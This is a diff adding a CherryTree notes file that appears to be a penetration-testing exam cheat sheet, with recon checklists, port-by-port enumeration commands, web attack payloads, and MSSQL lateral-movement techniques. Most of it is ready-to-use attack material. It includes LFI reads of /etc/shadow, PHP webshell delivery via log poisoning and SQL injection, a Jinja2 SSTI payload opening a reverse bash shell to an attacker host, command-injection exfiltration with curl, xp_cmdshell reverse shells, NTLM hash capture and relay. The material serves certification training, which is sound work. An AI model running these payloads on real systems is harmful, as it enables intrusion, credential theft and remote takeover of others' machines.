@@ -1,0 +1,504 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="Offensive Security" tags="" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+    <rich_text></rich_text>
+    
+    <node name="01. Methodology &amp; Exam Strategy" tags="" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+      <rich_text></rich_text>
+      
+      <node name="Initial Recon &amp; Workspace Setup" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>mkdir -p ~/exam/{ad,box1,box2,box3}/{scans,loot,exploits,screenshots}
+# Initialize local workspace architecture
+--------------------------------------------------
+for ip in &lt;MS01_IP&gt; &lt;MS02_IP&gt; &lt;DC_IP&gt; &lt;BOX1_IP&gt; &lt;BOX2_IP&gt; &lt;BOX3_IP&gt;; do nmap -sV --open -T4 $ip -oN ~/exam/scans/quick_$ip.txt &amp; done; wait
+# Parallel quick target service mapping
+--------------------------------------------------
+nmap -p- -sV -sC --open -T4 &lt;TARGET_IP&gt; -oN full_tcp.txt
+# Full TCP port scan with default scripts and versions
+--------------------------------------------------
+nmap -sU --top-ports 20 &lt;TARGET_IP&gt; -oN udp.txt
+# Top 20 UDP ports scan
+--------------------------------------------------</rich_text>
+      </node>
+
+      <node name="Exam Day Preparation &amp; Rules" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>☐ Establish connection to the exam VPN — verify target availability: ping -c 3 &lt;DC_IP&gt;
+# Pre-flight network check
+--------------------------------------------------
+☐ Document target IP data across scope: note specific DC, MS01, MS02, Box1, Box2, Box3
+# Scope documentation
+--------------------------------------------------
+☐ Update local /etc/hosts parameters mapping out IP strings to discovered target hostnames
+# Hosts file update
+--------------------------------------------------
+☐ Build local directory tree structures to store text logs, exploits, and evidence per target machine
+# Directory setup
+--------------------------------------------------
+☐ Create tracking markdown notes files for each machine scope to log credentials and commands
+# Notes initialization
+--------------------------------------------------
+☐ Verify local screenshot selection tools are active and responsive (Flameshot utility setup)
+# Screenshot tool check
+--------------------------------------------------
+☐ Initialize automated port scans against all assigned target IP ranges concurrently
+# Start background scans
+--------------------------------------------------
+☐ Configure Tmux layouts dedicating unique workspace terminal windows per target machine
+# Tmux layout setup
+--------------------------------------------------
+☐ Record provided initial Active Directory authentication profiles at the top of your master notes file
+# Record initial AD creds
+--------------------------------------------------
+☐ Abide by framework use restrictions: Metasploit usage is limited to one single target host across the entire exam
+# Metasploit limit rule
+--------------------------------------------------
+☐ Payload generation utilities like msfvenom are permitted across all machines to output basic connection payloads
+# Msfvenom allowed rule
+--------------------------------------------------</rich_text>
+      </node>
+
+      <node name="Proof Collection &amp; Verification" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>cat /home/&lt;USERNAME&gt;/local.txt &amp;&amp; whoami &amp;&amp; id &amp;&amp; hostname &amp;&amp; ip addr show
+# Linux low-privilege flag verification
+--------------------------------------------------
+cat /root/proof.txt &amp;&amp; whoami &amp;&amp; id &amp;&amp; hostname &amp;&amp; ip addr show
+# Linux root flag verification
+--------------------------------------------------
+type C:\Users\&lt;USERNAME&gt;\Desktop\local.txt &amp; whoami &amp; hostname &amp; ipconfig
+# Windows low-privilege flag verification
+--------------------------------------------------
+type C:\Users\Administrator\Desktop\proof.txt &amp; whoami &amp; hostname &amp; ipconfig /all
+# Windows administrative flag verification
+--------------------------------------------------
+type C:\Users\Administrator\Desktop\proof.txt &amp; whoami /all &amp; hostname &amp; ipconfig
+# Windows SYSTEM token privilege flag verification
+--------------------------------------------------
+find / -name "*.txt" 2&gt;/dev/null | xargs grep -l "OS{" 2&gt;/dev/null
+# Linux deep traversal search for hidden flags
+--------------------------------------------------
+dir /s /b C:\*.txt 2&gt;nul | findstr "local\|proof"
+# Windows deep traversal search for hidden flags
+--------------------------------------------------
+☐ Verify all evidence screenshots clearly display the flag token string, user identity, system hostname, and network IP details
+# Screenshot validation rule
+--------------------------------------------------
+☐ Confirm local documentation contains sufficient detail, parameters, and command strings to completely reproduce each step
+# Report reproduction rule
+--------------------------------------------------
+☐ Check that all custom exploit modifications and code adjustments are preserved to assist the 24-hour report writing phase
+# Exploit preservation rule
+--------------------------------------------------</rich_text>
+      </node>
+
+      <node name="Tactical Mindset &amp; Reset Checklist" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>☐ 1. Did the port scan sweep the entire keyspace? Ensure -p- was run to avoid missing non-standard ports
+# Reset check 1
+--------------------------------------------------
+☐ 2. Was UDP enumeration completed? Check for active UDP systems on port 161 running SNMP services
+# Reset check 2
+--------------------------------------------------
+☐ 3. Was the target web page source code fully reviewed? Check via Ctrl+U to uncover comments or hidden fields
+# Reset check 3
+--------------------------------------------------
+☐ 4. Have common infrastructure folders been checked manually? Look for robots.txt, /.git stores, or /.env parameters
+# Reset check 4
+--------------------------------------------------
+☐ 5. Have all discovered credentials and hash tokens been tested across every open network protocol?
+# Reset check 5
+--------------------------------------------------
+☐ 6. Have standard default credentials been tested against login fields? Check combinations like admin:admin or sa:blank
+# Reset check 6
+--------------------------------------------------
+☐ 7. Have exact software version numbers been cross-referenced with public exploit sites and online CVE databases?
+# Reset check 7
+--------------------------------------------------
+☐ 8. Has SearchSploit been run against all identified network service versions and application names?
+# Reset check 8
+--------------------------------------------------
+☐ 9. Have accessible SMB shares been reviewed and their configuration properties downloaded for text parsing?
+# Reset check 9
+--------------------------------------------------
+☐ 10. Has automated or manual SQL injection testing been completed on every discovered web parameter input field?
+# Reset check 10
+--------------------------------------------------
+☐ 11. Have path traversal and file inclusion strings been tested against all file loading or page navigation arguments?
+# Reset check 11
+--------------------------------------------------
+☐ 12. Have local audit logs from running LinPeas or WinPEAS been reviewed fully? Check highlighted red/yellow lines
+# Reset check 12
+--------------------------------------------------
+☐ 13. Have native privilege checks been completed manually? Look for sudo -l definitions, SUID files, or capabilities
+# Reset check 13
+--------------------------------------------------
+☐ 14. Have file lookups been run across standard directories to locate custom scripts, database passwords, or history files?
+# Reset check 14
+--------------------------------------------------
+☐ 15. Am I overcomplicating the attack path? Step back to evaluate simpler configurations or basic deployment flaws
+# Reset check 15
+--------------------------------------------------
+✗ Spending time running unstable kernel exploits before checking for simple configuration or permission errors
+# Rabbit hole: Kernel exploits
+--------------------------------------------------
+✗ Running brute-force attacks against SSH using massive dictionaries like rockyou, which causes high network noise
+# Rabbit hole: SSH brute force
+--------------------------------------------------
+✗ Missing credential leaks or valid user lists by ignoring stateless UDP port scanning on SNMP port 161
+# Rabbit hole: Ignoring SNMP
+--------------------------------------------------
+✗ Forgetting to test a discovered password across other open services or adjacent machine profiles
+# Rabbit hole: Password reuse
+--------------------------------------------------
+✗ Running automated web directory fuzzers for hours against completely static web pages lacking dynamic parameters
+# Rabbit hole: Endless fuzzing
+--------------------------------------------------
+✗ Stalling on a single attack path or payload variation for over 45 minutes without switching focus
+# Rabbit hole: 45-min stall
+--------------------------------------------------
+✗ Assuming an accessible database lacks external server links without querying linked configurations explicitly
+# Rabbit hole: MSSQL links
+--------------------------------------------------
+✗ Forgetting to extract plaintext history profiles stored within the PowerShell ConsoleHost_history.txt log file
+# Rabbit hole: PS History
+--------------------------------------------------
+✗ Missing database passwords by failing to check application configuration parameters like web.config files
+# Rabbit hole: Config files
+--------------------------------------------------
+✗ Abandoning custom SUID file evaluation without checking utility breakout rules listed on GTFObins
+# Rabbit hole: SUID GTFOBins
+--------------------------------------------------</rich_text>
+      </node>
+    </node>
+
+    <node name="02. Enumeration &amp; Initial Access" tags="" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+      <rich_text></rich_text>
+
+      <node name="Port to Action Decision Tree" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>PORT 21 (FTP) ➔ ftp &lt;IP&gt; (try anonymous:anonymous) ➔ Check permissions (read/write) ➔ Banner version ➔ searchsploit
+# FTP action plan
+--------------------------------------------------
+PORT 22 (SSH) ➔ Note version ➔ Investigate algorithms ➔ Use credentials found downstream ➔ ssh -i id_rsa user@&lt;IP&gt; (ensure chmod 600)
+# SSH action plan
+--------------------------------------------------
+PORT 23 (Telnet) ➔ telnet &lt;IP&gt; ➔ Test default/administrative combinations
+# Telnet action plan
+--------------------------------------------------
+PORT 25 (SMTP) ➔ smtp-user-enum -M VRFY -U users.txt -t &lt;IP&gt; ➔ Check open relay status via telnet ➔ Search version bugs
+# SMTP action plan
+--------------------------------------------------
+PORT 53 (DNS) ➔ dig axfr @&lt;IP&gt; &lt;domain&gt; ➔ dnsenum --dnsserver &lt;IP&gt; &lt;domain&gt; ➔ dnsrecon -d &lt;domain&gt; -t axfr (verify zone transfers)
+# DNS action plan
+--------------------------------------------------
+PORT 80/443 (HTTP/S) ➔ [SEE WEB ENUMERATION WORKFLOW BELOW]
+# HTTP/S action plan
+--------------------------------------------------
+PORT 88 (Kerberos) ➔ AD verified! ➔ Check user validation via blind pre-auth (kerbrute)
+# Kerberos action plan
+--------------------------------------------------
+PORT 111 (RPC/NFS) ➔ showmount -e &lt;IP&gt; ➔ mount -t nfs &lt;IP&gt;:/share /mnt/nfs -o nolock
+# NFS action plan
+--------------------------------------------------
+PORT 135 (MSRPC) ➔ Windows core system ➔ rpcclient -U "" -N &lt;IP&gt; (null session check)
+# MSRPC action plan
+--------------------------------------------------
+PORT 139/445 (SMB) ➔ [SEE SMB ENUMERATION BELOW]
+# SMB action plan
+--------------------------------------------------
+PORT 161 (SNMP UDP) ➔ snmpwalk -c public -v2c &lt;IP&gt; ➔ snmp-check &lt;IP&gt; -c public ➔ onesixtyone -c community_strings.txt &lt;IP&gt;
+# SNMP action plan
+--------------------------------------------------
+PORT 389/636 (LDAP) ➔ ldapsearch -x -H ldap://&lt;IP&gt; -b "DC=domain,DC=local" ➔ Verify anonymous binds ➔ Extract schema, user descriptions
+# LDAP action plan
+--------------------------------------------------
+PORT 1433 (MSSQL) ➔ [SEE MSSQL SECTION]
+# MSSQL action plan
+--------------------------------------------------
+PORT 3306 (MySQL) ➔ mysql -u root -h &lt;IP&gt; (check for empty/blank password)
+# MySQL action plan
+--------------------------------------------------
+PORT 3389 (RDP) ➔ Check NLA status ➔ Check BlueKeep ➔ Execute creds later via xfreerdp
+# RDP action plan
+--------------------------------------------------
+PORT 4444+ (Custom) ➔ nc -nv &lt;IP&gt; &lt;PORT&gt; ➔ Execute banner grabbing ➔ Research software string
+# Custom port action plan
+--------------------------------------------------
+PORT 5985 (WinRM) ➔ evil-winrm -i &lt;IP&gt; -u user -p pass (or pass-the-hash with -H)
+# WinRM action plan
+--------------------------------------------------
+PORT 8080 (Alt-HTTP) ➔ Inspect application manager panels (/manager/html, /admin)
+# Alt-HTTP action plan
+--------------------------------------------------
+PORT 8443 (Alt-HTTPS) ➔ Check SSL/TLS certificate fields for hidden subdomains/hostnames
+# Alt-HTTPS action plan
+--------------------------------------------------</rich_text>
+      </node>
+
+      <node name="Web Enumeration" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>whatweb http://&lt;TARGET_IP&gt; -v
+# Tech fingerprint and digital signature footprints
+--------------------------------------------------
+curl -IL http://&lt;TARGET_IP&gt;
+# Inspect web server response headers
+--------------------------------------------------
+nikto -h http://&lt;TARGET_IP&gt; -output nikto.txt &amp;
+# Automated web server vulnerability scan
+--------------------------------------------------
+gobuster dir -u http://&lt;TARGET_IP&gt; -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,asp,aspx,jsp,do,py -t 50 -o gobuster.txt
+# Large-scale directory web-content brute force
+--------------------------------------------------
+feroxbuster -u http://&lt;TARGET_IP&gt; -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,aspx -t 100 --depth 3 -o ferox.txt
+# Advanced recursive multi-threaded content brute force
+--------------------------------------------------
+curl -s http://&lt;TARGET_IP&gt;/robots.txt
+# Check sensitive endpoints: robots.txt
+--------------------------------------------------
+curl -s -I http://&lt;TARGET_IP&gt;/.git/HEAD
+# Check sensitive endpoints: Exposed Git repository
+--------------------------------------------------
+curl -s http://&lt;TARGET_IP&gt;/.env
+# Check sensitive endpoints: Raw environmental variables
+--------------------------------------------------
+curl -s -I http://&lt;TARGET_IP&gt;/backup/
+# Check sensitive endpoints: Backup archive storage
+--------------------------------------------------
+curl -s http://&lt;TARGET_IP&gt;/config.php
+# Check sensitive endpoints: Configuration files
+--------------------------------------------------
+curl -s http://&lt;TARGET_IP&gt;/.htaccess
+# Check sensitive endpoints: Directory rule overrides
+--------------------------------------------------
+view-source:http://&lt;TARGET_IP&gt;/
+# Browser: Inspect HTML comments for hardcoded credentials
+--------------------------------------------------
+gobuster vhost -u http://&lt;DOMAIN&gt; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 50 -o vhosts.txt
+# Virtual host and subdomain identity spraying
+--------------------------------------------------
+wpscan --url http://&lt;TARGET_IP&gt; --enumerate u,p,t,cb,dbe --plugins-detection aggressive
+# Automated WordPress core and installed plugins audit
+--------------------------------------------------
+joomscan -u http://&lt;TARGET_IP&gt;
+# Automated Joomla CMS structure scan
+--------------------------------------------------
+droopescan scan drupal -u http://&lt;TARGET_IP&gt;
+# Automated Drupal CMS architecture tracker
+--------------------------------------------------
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://&lt;TARGET_IP&gt;/page.php?FUZZ=test" -fs 0 -mc 200,301,302,500
+# Web request parameter fuzzing for hidden vulnerabilities
+--------------------------------------------------</rich_text>
+      </node>
+
+      <node name="Web Attacks" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>http://&lt;TARGET_IP&gt;/page.php?file=../../../../etc/passwd
+# LFI: Arbitrary file system traversal verification
+--------------------------------------------------
+http://&lt;TARGET_IP&gt;/page.php?file=../../../../etc/shadow
+# LFI: Test for misconfigured file permissions
+--------------------------------------------------
+http://&lt;TARGET_IP&gt;/page.php?file=/proc/self/environ
+# LFI: Extract in-memory environment properties
+--------------------------------------------------
+http://&lt;TARGET_IP&gt;/page.php?file=php://filter/convert.base64-encode/resource=config.php
+# LFI: Base64 decoded PHP filter source code disclosure
+--------------------------------------------------
+http://&lt;TARGET_IP&gt;/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+# LFI: Execution of arbitrary in-memory PHP payload wrappers
+--------------------------------------------------
+curl -A '&lt;?php system($_GET["cmd"]); ?&gt;' http://&lt;TARGET_IP&gt;/
+# Log Poisoning: Inject code into Apache/Nginx User-Agent field
+--------------------------------------------------
+http://&lt;TARGET_IP&gt;/page.php?file=/var/log/apache2/access.log&amp;cmd=id
+# Log Poisoning: Execute weaponized local web access log
+--------------------------------------------------
+ssh '&lt;?php system($_GET["cmd"]); ?&gt;'@&lt;TARGET_IP&gt;
+# Log Poisoning: SSH authentication error streams injection
+--------------------------------------------------
+http://&lt;TARGET_IP&gt;/page.php?file=/var/log/auth.log&amp;cmd=whoami
+# Log Poisoning: Context verification for poisoned auth logs
+--------------------------------------------------
+' OR '1'='1'-- -
+# SQLi: Authentication bypass core triage test
+--------------------------------------------------
+' UNION SELECT 1,load_file('/etc/passwd'),3-- -
+# SQLi: Manual union-based system file read execution
+--------------------------------------------------
+' UNION SELECT 1,"&lt;?php system($_GET['cmd']); ?&gt;",3 INTO OUTFILE '/var/www/html/cmd.php'-- -
+# SQLi: Backdoor webshell delivery via arbitrary output files
+--------------------------------------------------
+sqlmap -u "http://&lt;TARGET_IP&gt;/login.php" --data="user=admin&amp;pass=x" --level=5 --risk=3 --dbs
+# SQLi: Automated web database injection exploration
+--------------------------------------------------
+sqlmap -u "http://&lt;TARGET_IP&gt;/item?id=1" --os-shell
+# SQLi: Automated backdoor shell spawning
+--------------------------------------------------
+sqlmap -u "http://&lt;TARGET_IP&gt;/item?id=1" --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php
+# SQLi: Automated file system write manipulations
+--------------------------------------------------
+# 1. MIME type tampering: Modify header Content-Type to match image/jpeg
+# 2. Magic bytes verification prepend: Prepend GIF89a to the script header
+# 3. Double extension mapping: Execute shell.php.jpg or handle trailing breaks like shell.php%00.jpg
+# 4. Case validation shifts: Alter string into shell.pHp or write shell.PHP
+# 5. Alternative execution extensions: Swap filters with .php3, .php4, .php5, .phtml, .phar, .shtml
+# 6. Blacklist rule dropouts: Identify untracked configurations like .php7 or check .inc paths
+# 7. Injected trailing null bytes (Legacy architectures): Force processing dropouts using shell.php%00.gif
+# File Upload: Arbitrary bypass structural extensions checklist
+--------------------------------------------------
+{{7*7}}
+# SSTI: Returns 49 = Jinja2 / Twig Engine Profile
+--------------------------------------------------
+${7*7}
+# SSTI: Returns 49 = FreeMarker / Mako Architecture Match
+--------------------------------------------------
+&lt;%= 7*7 %&gt;
+# SSTI: Returns 49 = ERB (Ruby Framework Signature)
+--------------------------------------------------
+#{7*7}
+# SSTI: Returns 49 = Ruby / Structural Pebble Context
+--------------------------------------------------
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+# SSTI: Python Jinja2 engine native sandboxed RCE
+--------------------------------------------------
+{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/4444 0&gt;&amp;1"').read()}}
+# SSTI: Jinja2 payload forcing reverse bash terminal ingress
+--------------------------------------------------
+{{['id']|filter('system')}}
+# SSTI: Twig server-side template engine arbitrary code injection
+--------------------------------------------------
+ping=127.0.0.1; whoami
+# Command Injection: Native operational parameter chaining (;)
+--------------------------------------------------
+ping=127.0.0.1|whoami
+# Command Injection: Native operational parameter chaining (|)
+--------------------------------------------------
+ping=127.0.0.1`whoami`
+# Command Injection: Native operational parameter chaining (`)
+--------------------------------------------------
+ping=127.0.0.1; curl http://&lt;LHOST&gt;/?x=$(id|base64)
+# Command Injection: Out-Of-Bounds (OOB) cryptographic exfiltration
+--------------------------------------------------</rich_text>
+      </node>
+
+      <node name="SMB Enumeration" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>smbclient -L //&lt;TARGET_IP&gt; -N
+# Unauthenticated baseline null session check
+--------------------------------------------------
+smbmap -H &lt;TARGET_IP&gt; -u '' -p ''
+# Null session share mapping access permissions check
+--------------------------------------------------
+crackmapexec smb &lt;TARGET_IP&gt; -u '' -p '' --shares
+# Unauthenticated null session domain reconnaissance modules
+--------------------------------------------------
+crackmapexec smb &lt;TARGET_IP&gt; -u 'guest' -p '' --shares
+# Guest user account authorization permissions scan
+--------------------------------------------------
+nmap --script smb-vuln* -p 445 &lt;TARGET_IP&gt;
+# Scripted SMB engine common security weakness scans
+--------------------------------------------------
+nmap --script smb-vuln-ms17-010 -p 445 &lt;TARGET_IP&gt;
+# Targeted legacy core memory corruption check (MS17-010)
+--------------------------------------------------
+crackmapexec smb &lt;TARGET_IP&gt; -u user -p pass --shares --users --groups --pass-pol
+# Authenticated domain objects, policy, and shares discovery
+--------------------------------------------------
+smbmap -H &lt;TARGET_IP&gt; -u user -p pass -R
+# Recursive listing of writable target shares partitions
+--------------------------------------------------
+smbclient //&lt;TARGET_IP&gt;/share -U 'user%pass'
+# Manual interactive authenticated share drive connection
+--------------------------------------------------
+smbclient //&lt;TARGET_IP&gt;/SHARE -U 'user%pass' -c 'recurse ON; prompt OFF; mget *'
+# Recursive mass extraction and download of share contents
+--------------------------------------------------
+crackmapexec smb &lt;TARGET_IP&gt; -u user -p pass -M spider_plus
+# Spidering shared files for hardcoded configuration strings
+--------------------------------------------------</rich_text>
+      </node>
+
+      <node name="SNMP Enumeration" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt &lt;TARGET_IP&gt;
+# Community string dictionary bruteforce scan
+--------------------------------------------------
+snmpwalk -c public -v1 &lt;TARGET_IP&gt;
+# Full MIB sub-tree walk (SNMPv1 profile endpoint)
+--------------------------------------------------
+snmpwalk -c public -v2c &lt;TARGET_IP&gt; 1.3.6.1.2.1.25.4.2.1.2
+# OID active process space extraction tree scan
+--------------------------------------------------
+snmpwalk -c public -v2c &lt;TARGET_IP&gt; 1.3.6.1.2.1.25.6.3.1.2
+# OID installed software application inventory scan
+--------------------------------------------------
+snmpwalk -c public -v2c &lt;TARGET_IP&gt; 1.3.6.1.4.1.77.1.2.25
+# OID Windows domain system accounts collection
+--------------------------------------------------
+snmp-check &lt;TARGET_IP&gt; -c public
+# Scripted engine configuration report mapping
+--------------------------------------------------</rich_text>
+      </node>
+
+      <node name="MSSQL Attacks &amp; Lateral Movement" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>mssqlclient.py corp.local/sa@&lt;TARGET_IP&gt; -windows-auth
+# Connect to remote SQL instance using Windows domain tokens
+--------------------------------------------------
+mssqlclient.py sa@&lt;TARGET_IP&gt;
+# Connect to remote SQL instance using native SQL accounts
+--------------------------------------------------
+sqlcmd -S &lt;TARGET_IP&gt; -U sa -P password -Q "SELECT @@version"
+# Local endpoint inline structural Transact-SQL connection
+--------------------------------------------------
+. .\PowerUpSQL.ps1; Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
+# Automated domain-wide SQL engine authentication capability mapping
+--------------------------------------------------
+SELECT @@version; SELECT SYSTEM_USER; SELECT USER_NAME(); SELECT IS_SRVROLEMEMBER('sysadmin');
+# Enumerate instance details, active user properties, and sysadmin status
+--------------------------------------------------
+SELECT name FROM master.dbo.sysdatabases;
+# Enumerate all local databases within the instance
+--------------------------------------------------
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
+# Check if active account holds explicit impersonation privileges
+--------------------------------------------------
+EXEC sp_linkedservers;
+# Identify linked database infrastructure parameters across networks
+--------------------------------------------------
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+# Enable xp_cmdshell for operating system command injection
+--------------------------------------------------
+EXEC xp_cmdshell 'whoami';
+# Execute system administrative queries via the shell primitive
+--------------------------------------------------
+EXEC xp_cmdshell 'powershell -nop -w hidden -enc &lt;BASE64_PAYLOAD&gt;';
+# Spawn a reverse shell connection via inline base64 PowerShell payload
+--------------------------------------------------
+EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin');
+# Impersonation Attack: Switch session authorization context to 'sa'
+--------------------------------------------------
+REVERT;
+# Drop the elevated context token to restore default session settings
+--------------------------------------------------
+SELECT * FROM OPENQUERY("MS02\SQLEXPRESS", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
+# Linked Server: Submit open queries to verify system user settings
+--------------------------------------------------
+EXEC ('xp_cmdshell ''whoami''') AT [MS02\SQLEXPRESS];
+# Linked Server: Execute operating system commands remotely across the link
+--------------------------------------------------
+EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [MS03]') AT [MS02\SQLEXPRESS];
+# Linked Server: Execute nested command strings across multiple database hops
+--------------------------------------------------
+sudo responder -I tun0 -v
+# Prepare inbound network share traffic capturing engines
+--------------------------------------------------
+EXEC xp_dirtree '\\&lt;LHOST&gt;\share';
+# Force remote database engines outbound access to attacker mounts (Hash Capture)
+--------------------------------------------------
+hashcat -m 5600 netntlm.txt /usr/share/wordlists/rockyou.txt
+# Run decryption attacks against captured NetNTLMv2 network exchanges
+--------------------------------------------------
+sudo python3 ntlmrelayx.py -t smb://&lt;TARGET_IP&gt; -smb2support
+# Deploy in-network NTLM relay authentication hijacking servers
+--------------------------------------------------
+BULK INSERT ##tempcsv FROM 'C:\Windows\System32\drivers\etc\hosts' WITH (ROWTERMINATOR = '\n', FIELDTERMINATOR = ','); SELECT * FROM ##tempcsv;
+# Read internal files from disk and store text contents into temporary tables
+--------------------------------------------------</rich_text>
+      </node>
+    </node>
+
+  </node>
+</cherrytree>
